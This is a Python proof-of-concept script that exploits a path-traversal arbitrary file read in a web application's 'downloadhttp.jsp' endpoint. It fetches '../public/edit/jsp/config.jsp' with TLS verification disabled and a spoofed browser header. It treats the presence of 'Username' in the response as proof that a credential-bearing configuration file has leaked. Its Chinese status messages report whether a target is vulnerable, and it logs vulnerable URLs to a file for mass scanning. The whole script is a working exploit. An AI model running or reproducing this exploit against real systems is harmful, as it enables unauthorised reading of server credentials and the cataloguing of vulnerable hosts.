import requests
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()
from colorama import init,Fore
init(autoreset=True)


def poc(url):
    try:
        target = urljoin(url,"/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp")
        header = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Connection': 'close'
        }
        res = requests.get(url=target,headers=header,verify=False,timeout=5)
        if res.status_code == 200 and 'Username' in res.text:
            print(Fore.GREEN + url +'[+]存在downloadhttp任意文件读取漏洞')
            with open(r'output.txt', 'a+') as w:
                w.write(url+"存在downloadhttp任意文件读取漏洞"'\n')
            print("[" + "-" * 80 + "]")
        else:
            print(Fore.RED + url +'[-]不存在漏洞')
            print("[" + "-" * 80 + "]")
    except Exception as err:
        print(err)
    
